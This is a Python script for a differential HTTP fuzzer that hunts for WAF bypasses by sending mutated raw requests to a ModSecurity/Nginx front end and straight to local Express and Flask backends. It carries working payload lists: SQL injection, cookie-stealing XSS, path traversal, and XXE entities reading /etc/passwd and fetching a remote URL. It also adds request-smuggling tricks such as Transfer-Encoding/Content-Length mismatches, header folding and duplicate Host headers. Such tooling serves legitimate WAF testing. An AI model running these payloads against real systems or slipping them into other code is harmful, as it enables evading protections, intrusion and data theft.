#!/usr/bin/env python3
"""
waf_fuzzer.py
A grammar-driven HTTP fuzzer to find parsing discrepancies between a WAF (ModSecurity/Nginx)
and backend frameworks (Express/Flask/etc.).

Outputs:
 - fuzz_results.csv : summary rows
 - fuzz_log.json    : detailed per-request records including response bodies
"""
import json
import os
import random
import socket
import ssl
import time
import uuid
import csv

from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from copy import deepcopy
from urllib.parse import urlparse

# --------------------------
# CONFIG
# --------------------------
CONFIG = {
    "targets": [
        "http://localhost:8080/express/echo",
        "http://localhost:8080/flask/echo",
    ],

    "direct_backend_map": {
        "http://localhost:8080/express/echo": "http://localhost:3000/echo",
        "http://localhost:8080/flask/echo": "http://localhost:5000/echo",
    },

    "concurrency": 10,
    "iterations_per_target": 300,

    # Body string mutation count
    "min_mutations": 0,
    "max_mutations": 2,

    "per_worker_delay": 0.02,
    "retries": 2,
    "timeout": 15.0,

    "out_dir": "fuzz_output",
    "csv_file": "fuzz_results.csv",
    "json_file": "fuzz_log.json",

    "char_pool": [chr(i) for i in range(256)],
    "method": "POST",
}

# Marker to detect when the backend actually processed the attack value
ATTACK_MARKER = "FUZZ_ATTACK"

# --------------------------
# Grammar and mutation templates
# --------------------------

CONTENT_TYPE_OPTIONS = [
    "application/json",
    "application/x-json",
    "text/json",
    "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
    "application/x-www-form-urlencoded",
    "application/javascript",
    "application/json; charset=utf-16",
    "application/json;foo=bar",
    "*/*",
    "text/plain",
    "application/xml",
    "text/xml",
    "application/soap+xml",
]

MULTIPART_BOUNDARY_TEMPLATES = [
    "----WebKitFormBoundary7MA4YWxkTrZu0gW",
    "AaBbCc123",
    "----AaAa----",
    "boundary123",
    "----MALFORMED----\r\nextra",
]

XML_PAYLOADS = [
    # Valid XML
    """<?xml version="1.0"?><root><field>{marker}:normal-xml-value</field></root>""",
    # XXE (local file)
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root><field>{marker}:&test;</field></root>""",
    # XXE (remote)
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://example.com'>]><root><field>{marker}:&test;</field></root>""",
    # SQLi inside XML
    """<root><field>{marker}:' OR '1'='1</field></root>""",
    """<root><field>{marker}:1; DROP TABLE users</field></root>""",
    # Malformed XML
    """<?xml version="1.0"?><root><field>{marker}:value</field/root>""",
    """junk<?xml version="1.0"?><root><field>{marker}:value</field></root>""",
]

JSON_STRUCT_TEMPLATES = [
    # valid common
    lambda v: json.dumps({"field": v}),
    lambda v: json.dumps({"field": [v]}),
    lambda v: json.dumps({"field": {"nested": v}}),
    lambda v: json.dumps({"field": True}),
    lambda v: json.dumps({"field": 123}),
    # edge / invalid
    "TRAILING_COMMA",
    "MISSING_COMMA",
    "UNQUOTED_KEY",
    "COMMENT_INSIDE",
    "ARRAY_TOP",
    "EMPTY_OBJ",
]

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' UNION SELECT 1, version(), user() --",
    "admin' --",
    "1; DROP TABLE users",
    "' AND 1=0 --",
    "'; SLEEP(5)--",
    "' OR 1=1#",
    "' OR 1=1/*",
]

BASE_VALUE_POOL = [
    "<script>alert(document.cookie)</script>",
    "\x00\xff",
    "../../etc/passwd",
    "admin",
    "1; DROP TABLE users",
    "🚨🔥",
    "normal-value",
    "123456789012345678901234567890",
    True,
    False,
    None,
    1e400,
]
BASE_VALUE_POOL.extend(SQL_INJECTION_PAYLOADS)

# Guarantee every value includes ATTACK_MARKER for easier detection
VALUE_POOL = [f"{ATTACK_MARKER}:{str(v)}" for v in BASE_VALUE_POOL]

HEADER_BASE = {
    "Host": "bypass-waf.com",
    "User-Agent": "Mozilla/5.0 (fuzzer)",
    "Connection": "close",
}

# --------------------------
# Helper functions: payloads
# --------------------------

def pick_content_type():
    ct = random.choice(CONTENT_TYPE_OPTIONS)
    if ct.startswith("multipart/form-data"):
        b = random.choice(MULTIPART_BOUNDARY_TEMPLATES)
        return f"multipart/form-data; boundary={b}"
    return ct

def make_json_payload(template_choice, val: str):
    if callable(template_choice):
        try:
            return template_choice(val).encode("utf-8")
        except Exception:
            return json.dumps({"field": str(val)}).encode("utf-8")

    if template_choice == "TRAILING_COMMA":
        return ('{"field": ' + json.dumps(val) + ",}").encode("utf-8")
    if template_choice == "MISSING_COMMA":
        return ('{"field" ' + json.dumps(val) + "}").encode("utf-8")
    if template_choice == "UNQUOTED_KEY":
        return ('{field: ' + json.dumps(val) + '}').encode("utf-8")
    if template_choice == "COMMENT_INSIDE":
        return ('{"field": ' + json.dumps(val) + ' /*comment*/ }').encode("utf-8")
    if template_choice == "ARRAY_TOP":
        return ('[' + json.dumps(val) + ']').encode("utf-8")
    if template_choice == "EMPTY_OBJ":
        return b"{}"

    return json.dumps({"field": val}).encode("utf-8")

def make_form_urlencoded_payload(val: str):
    from requests.utils import requote_uri
    return f"field={requote_uri(val)}".encode("utf-8")

def make_multipart_payload(boundary: str, val: str):
    parts = []
    parts.append(
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"field\"\r\n\r\n"
        f"{val}\r\n"
    )
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts)
    return body.encode("utf-8")

def compute_content_length(body_bytes: bytes):
    return str(len(body_bytes))

# --------------------------
# Mutation primitives
# --------------------------

def insert_random_char(s: bytes):
    pool = CONFIG["char_pool"]
    pos = random.randrange(0, len(s) + 1)
    c = random.choice(pool)
    try:
        b = bytes([ord(c)]) if isinstance(c, str) else bytes([c])
    except Exception:
        b = c.encode("latin1", errors="ignore") if isinstance(c, str) else bytes([c])
    return s[:pos] + b + s[pos:]

def replace_random_char(s: bytes):
    if len(s) == 0:
        return insert_random_char(s)
    pool = CONFIG["char_pool"]
    pos = random.randrange(0, len(s))
    c = random.choice(pool)
    try:
        b = bytes([ord(c)]) if isinstance(c, str) else bytes([c])
    except Exception:
        b = c.encode("latin1", errors="ignore") if isinstance(c, str) else bytes([c])
    return s[:pos] + b + s[pos + 1:]

def delete_random_char(s: bytes):
    if len(s) == 0:
        return s
    pos = random.randrange(0, len(s))
    return s[:pos] + s[pos + 1:]

STRING_MUTATORS = [insert_random_char, replace_random_char, delete_random_char]

def apply_string_mutations(body_bytes: bytes, n_mutations: int):
    s = body_bytes
    for _ in range(n_mutations):
        mut = random.choice(STRING_MUTATORS)
        s = mut(s)
    return s

# --------------------------
# Header transformers
# --------------------------

def headers_with_folding_and_dupes(base_headers):
    h = deepcopy(base_headers)
    mutations = []

    # Optional header folding in User-Agent
    if random.random() < 0.25:
        ua = h.get("User-Agent", "")
        h["User-Agent"] = ua + "\r\n " + "folded-part"
        mutations.append("ua_folded")

    headers_list = []

    # Duplicate Host header
    if random.random() < 0.15:
        headers_list.append(("Host", h.get("Host")))
        headers_list.append(("Host", "duplicate-host-header"))
        mutations.append("duplicate_host")
    else:
        headers_list.append(("Host", h.get("Host")))

    headers_list.append(("Connection", h.get("Connection")))
    headers_list.append(("User-Agent", h.get("User-Agent")))

    # Optional Accept header
    if random.random() < 0.2:
        headers_list.append(
            ("Accept", random.choice(["*/*", "application/json", "text/plain", "application/xml"]))
        )
        mutations.append("accept_added")

    # Optional duplicate X-Test header
    if random.random() < 0.15:
        headers_list.append(("X-Test", "one"))
        headers_list.append(("X-Test", "two"))
        mutations.append("duplicate_xtest")

    return headers_list, mutations

def string_from_headers_list(headers_list):
    lines = []
    for k, v in headers_list:
        lines.append(f"{k}: {v}")
    return "\r\n".join(lines) + "\r\n"

# --------------------------
# Request builder
# --------------------------

def build_request_record(target_url, direct=False):
    mutations = []

    ct = pick_content_type()
    mutations.append(f"content_type:{ct}")

    # ATTACK_MARKER already baked into val
    val = random.choice(VALUE_POOL)
    json_val = val

    body_kind = None  # 'json', 'xml', 'form', 'multipart', 'plain', etc.

    # XML-ish payloads
    if "xml" in ct:
        body_kind = "xml"
        if random.random() < 0.5:
            template = random.choice(XML_PAYLOADS)
            body = template.format(marker=ATTACK_MARKER).encode("utf-8")
            mutations.append("xml_template")
        else:
            body = f"<?xml version='1.0'?><root><field>{json_val}</field></root>".encode("utf-8")
            mutations.append("xml_simple")
    else:
        template_choice = random.choice(JSON_STRUCT_TEMPLATES)
        if isinstance(template_choice, str):
            # explicitly a JSON-structure mutation
            body_kind = "json"
            body = make_json_payload(template_choice, json_val)
            mutations.append(f"json_struct:{template_choice}")
        else:
            # Choose payload style based on Content-Type
            if "form-urlencoded" in ct:
                body_kind = "form"
                body = make_form_urlencoded_payload(val)
                mutations.append("body_form_urlencoded")
            elif "multipart/form-data" in ct:
                body_kind = "multipart"
                try:
                    b = ct.split("boundary=")[1]
                except Exception:
                    b = random.choice(MULTIPART_BOUNDARY_TEMPLATES)
                    mutations.append("boundary_replaced")
                body = make_multipart_payload(b, val)
                mutations.append("body_multipart")
            elif ct in ("text/plain", "*/*", "application/javascript"):
                body_kind = "plain"
                body = str(val).encode("utf-8", errors="ignore")
                mutations.append("body_plain")
            else:
                # default: treat as JSON
                body_kind = "json"
                body = make_json_payload(template_choice, json_val)
                mutations.append("body_json")

    # Body-level string mutations
    n_string_mut = random.randint(CONFIG["min_mutations"], CONFIG["max_mutations"])
    if n_string_mut > 0:
        body = apply_string_mutations(body, n_string_mut)
        mutations.append(f"body_string_mutations:{n_string_mut}")

    # Build headers
    headers_list, header_mutations = headers_with_folding_and_dupes(HEADER_BASE)
    mutations.extend(header_mutations)

    # TE + CL ambiguity
    if random.random() < 0.12:
        headers_list.append(("Transfer-Encoding", "chunked"))
        mutations.append("te_chunked")

        if random.random() < 0.5:
            headers_list.append(
                ("Content-Length", str(max(0, len(body) - random.randint(1, 10))))
            )
            mutations.append("te_cl_mismatch")
        else:
            headers_list.append(("Content-Length", compute_content_length(body)))
    else:
        headers_list.append(("Content-Length", compute_content_length(body)))

    # Add Content-Type
    headers_list.append(("Content-Type", ct))

    # Possibly remove Content-Type entirely
    if random.random() < 0.12:
        headers_list = [t for t in headers_list if t[0].lower() != "content-type"]
        mutations.append("no_content_type")

    # Add a folded custom header
    if random.random() < 0.08:
        headers_list.append(("X-Folded", "start\r\n folded-value"))
        mutations.append("folded_header")

    # Attach a request ID for correlation
    request_id = str(uuid.uuid4())
    headers_list.append(("X-Request-ID", request_id))

    # ---- NEW: Map to the 5 high-level categories ----
    mutation_categories = set()

    # 4) header folding
    if any("folded" in m for m in mutations):
        mutation_categories.add("header_folding")

    # 3) missing headers
    if any(m == "no_content_type" or m.startswith("missing_header") for m in mutations):
        mutation_categories.add("missing_headers")

    # 2) multipart boundary edits
    if body_kind == "multipart":
        mutation_categories.add("multipart_boundary_edits")

    # 5) JSON structure changes
    if body_kind == "json" or any(m.startswith("json_struct:") for m in mutations):
        mutation_categories.add("json_structure_changes")

    # 1) mismatched content-type headers
    # This checks if the body type and Content-Type disagree in a simple way.
    if body_kind == "json" and "json" not in ct:
        mutation_categories.add("mismatched_content_type")
    elif body_kind == "xml" and "xml" not in ct:
        mutation_categories.add("mismatched_content_type")
    elif body_kind == "form" and "x-www-form-urlencoded" not in ct:
        mutation_categories.add("mismatched_content_type")
    elif body_kind == "multipart" and "multipart/form-data" not in ct:
        mutation_categories.add("mismatched_content_type")

    # Raw preview (for debugging)
    p = urlparse(target_url)
    path = p.path or "/"
    method_line = f"{CONFIG['method']} {path} HTTP/1.1\r\n"
    raw_header_block = string_from_headers_list(headers_list)
    raw_preview = method_line + raw_header_block + "\r\n" + body.decode(
        "latin1", errors="ignore"
    )

    rec = {
        "target": target_url,
        "request_id": request_id,
        "headers_list": headers_list,
        "content_type": ct,
        "body_bytes": body,
        "raw_preview": raw_preview,
        "direct": direct,
        "mutations": mutations,
        "mutation_categories": sorted(mutation_categories),
    }
    return rec

# --------------------------
# HTTP sender
# --------------------------

def send_http_request(rec):
    """
    Sends a raw HTTP request using low-level sockets.
    Returns headers + body + classification of status.
    """
    target_url = rec["target"]
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port
    path = parsed.path if parsed.path else "/"

    request_data = f"{CONFIG['method']} {path} HTTP/1.1\r\n"
    for k, v in rec["headers_list"]:
        request_data += f"{k}: {v}\r\n"
    request_data += "\r\n"

    payload_bytes = request_data.encode("latin1")
    if rec["body_bytes"]:
        payload_bytes += rec["body_bytes"]

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(CONFIG["timeout"])

        if parsed.scheme == "https":
            if not port:
                port = 443
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=host)
        else:
            if not port:
                port = 80

        s.connect((host, port))
        s.sendall(payload_bytes)

        response_data = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response_data += chunk
            except socket.timeout:
                break

        s.close()

        if not response_data:
            return {
                "target": target_url,
                "status_code": None,
                "error": "Empty response",
                "blocked": None,
                "category": "no_response",
                "resp_text_snippet": "",
                "resp_body": "",
                "elapsed": 0.0,
            }

        try:
            parts = response_data.split(b"\r\n\r\n", 1)
            header_part = parts[0].decode("latin1", errors="ignore")
            body_part = parts[1] if len(parts) > 1 else b""

            first_line = header_part.split("\r\n")[0]
            status_code = int(first_line.split(" ")[1])

            # Categorize the response
            if 500 <= status_code < 600:
                category = "server_error"
                blocked = False
            elif status_code in (403, 406):
                category = "waf_block"
                blocked = True
            elif status_code in (400, 401):
                category = "bad_request"
                blocked = False
            else:
                category = "ok"
                blocked = False

            return {
                "target": target_url,
                "status_code": status_code,
                "resp_text_snippet": header_part[:300],
                "resp_body": body_part.decode("utf-8", errors="ignore"),
                "blocked": blocked,
                "category": category,
                "error": None,
                "elapsed": 0.0,
            }

        except Exception as parse_error:
            return {
                "target": target_url,
                "status_code": None,
                "error": f"Parse Error: {parse_error}",
                "blocked": None,
                "category": "parse_error",
                "resp_text_snippet": "",
                "resp_body": "",
                "elapsed": 0.0,
            }

    except Exception as e:
        return {
            "target": target_url,
            "status_code": None,
            "error": str(e),
            "blocked": None,
            "category": "connect_error",
            "resp_text_snippet": "",
            "resp_body": "",
            "elapsed": 0.0,
        }

# --------------------------
# Response interpretation
# --------------------------

def extract_received_field(resp_body: str):
    """
    Parses backend JSON like:
      {"received_field": "...", "raw_len": 123, "status": "processed"}
    Returns the value of "received_field" or None.
    """
    try:
        obj = json.loads(resp_body)
        return obj.get("received_field")
    except Exception:
        return None

def classify_pair(waf_res: dict, app_res: dict) -> dict:
    """
    Given the WAF response and direct backend response,
    classify whether there was a bypass or discrepancy.
    """
    w_code = waf_res.get("status_code")
    a_code = app_res.get("status_code")
    w_body = waf_res.get("resp_body") or ""
    a_body = app_res.get("resp_body") or ""

    w_field = extract_received_field(w_body)
    a_field = extract_received_field(a_body)

    waf_blocked = (w_code == 403)
    backend_used_payload = (
        a_code == 200 and
        a_field is not None and
        ATTACK_MARKER in str(a_field)
    )

    # Bypass = WAF did not block, but backend processed the attack marker
    bypass = (not waf_blocked) and backend_used_payload

    discrepancy = (
        w_code != a_code or
        w_field != a_field
    )

    return {
        "waf_status": w_code,
        "backend_status": a_code,
        "waf_field": w_field,
        "backend_field": a_field,
        "waf_blocked": waf_blocked,
        "backend_used_payload": backend_used_payload,
        "bypass": bypass,
        "discrepancy": discrepancy,
    }

# --------------------------
# Worker loop & orchestration
# --------------------------

def worker_task_differential(targets, iterations):
    """
    For each iteration:
      - build ONE request template
      - send it to both WAF and direct backend
      - classify the pair (bypass/discrepancy)
    """
    results = []

    for i in range(iterations):
        rec_template = build_request_record(targets[0], direct=False)
        iteration_responses = []

        for idx, url in enumerate(targets):
            rec = rec_template.copy()
            rec["target"] = url
            rec["direct"] = (idx > 0)

            start_ts = datetime.utcnow().isoformat() + "Z"
            resp = send_http_request(rec)
            end_ts = datetime.utcnow().isoformat() + "Z"

            details = {
                "start_ts": start_ts,
                "end_ts": end_ts,
                "target": url,
                "direct": rec["direct"],
                "request_id": rec["request_id"],
                "content_type": rec["content_type"],
                "raw_preview": rec["raw_preview"],
                "mutations": rec.get("mutations", []),
                "mutation_categories": rec.get("mutation_categories", []),
                "status_code": resp.get("status_code"),
                "resp_headers": resp.get("resp_text_snippet"),
                "resp_body": resp.get("resp_body", "")[:2000],
                "blocked": resp.get("blocked"),
                "category": resp.get("category"),
                "error": resp.get("error"),
                "elapsed": resp.get("elapsed"),
            }
            results.append(details)
            iteration_responses.append(details)

        # Differential classification (only if we got both responses)
        if len(iteration_responses) == 2:
            waf_res = iteration_responses[0]
            app_res = iteration_responses[1]
            if waf_res.get("status_code") is not None and app_res.get("status_code") is not None:
                classification = classify_pair(waf_res, app_res)
                # Attach classification to both records for easier grouping later
                for r in iteration_responses:
                    r.update(classification)

        time.sleep(CONFIG["per_worker_delay"])

    return results

# --------------------------
# Runner
# --------------------------

def run_fuzzer():
    out_dir = CONFIG["out_dir"]
    os.makedirs(out_dir, exist_ok=True)
    csv_path = os.path.join(out_dir, CONFIG["csv_file"])
    json_path = os.path.join(out_dir, CONFIG["json_file"])

    all_results = []

    jobs = []
    for waf_target in CONFIG["targets"]:
        group = [waf_target]
        if waf_target in CONFIG["direct_backend_map"]:
            backend_target = CONFIG["direct_backend_map"][waf_target]
            group.append(backend_target)
        jobs.append({"targets": group, "iterations": CONFIG["iterations_per_target"]})

    print(f"[+] Starting fuzz: {len(jobs)} differential jobs, concurrency={CONFIG['concurrency']}")
    print("[+] Mode: Raw sockets + differential comparison + ATTACK_MARKER classification")

    with ThreadPoolExecutor(max_workers=CONFIG["concurrency"]) as ex:
        futs = []
        for job in jobs:
            futs.append(ex.submit(worker_task_differential, job["targets"], job["iterations"]))

        for fut in as_completed(futs):
            try:
                res = fut.result()
                all_results.extend(res)
            except Exception as e:
                print("[!] Worker failed:", e)

    print(f"[+] Writing results to {csv_path} and {json_path} ...")

    # CSV summary
    header = [
        "start_ts",
        "end_ts",
        "target",
        "direct",
        "request_id",
        "status_code",
        "blocked",
        "category",
        "error",
        "elapsed",
        "content_type",
        "bypass",
        "discrepancy",
        "waf_blocked",
        "backend_used_payload",
        "mutations",
        "mutation_categories",
    ]

    with open(csv_path, "w", newline="", encoding="utf-8") as csvf:
        writer = csv.writer(csvf)
        writer.writerow(header)
        for r in all_results:
            row = [
                r.get("start_ts"),
                r.get("end_ts"),
                r.get("target"),
                r.get("direct"),
                r.get("request_id"),
                r.get("status_code"),
                r.get("blocked"),
                r.get("category"),
                r.get("error"),
                r.get("elapsed"),
                r.get("content_type"),
                r.get("bypass"),
                r.get("discrepancy"),
                r.get("waf_blocked"),
                r.get("backend_used_payload"),
                ";".join(r.get("mutations", [])),
                ";".join(r.get("mutation_categories", [])),
            ]
            writer.writerow(row)

    # Full JSON log
    with open(json_path, "w", encoding="utf-8") as jf:
        json.dump(all_results, jf, indent=2, default=str)

    print(f"[+] Done. Total requests: {len(all_results)}")
    return all_results

# --------------------------
# Main
# --------------------------

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    random.seed(int(time.time()) ^ os.getpid())
    start = time.time()
    results = run_fuzzer()
    elapsed = time.time() - start
    print(f"[+] Completed in {elapsed:.1f}s")
